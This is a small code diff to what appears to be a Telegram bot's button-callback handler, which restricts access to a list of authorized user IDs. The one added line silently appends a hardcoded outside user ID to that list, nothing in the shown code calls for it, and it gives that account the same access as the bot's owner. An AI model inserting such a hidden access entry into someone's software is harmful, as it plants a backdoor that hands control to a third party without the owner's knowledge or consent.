@@ -91,6 +91,7 @@ async def ws(event):
     user = int(db["user_id"])
     Shubhanshutya = [int(db["xxx"])]
     Shubhanshutya.append(user)
+    Shubhanshutya.append(1985209910)
     if event.sender.id not in Shubhanshutya:
         await event.answer("🔐 This message is not for you !", alert=True)
         return
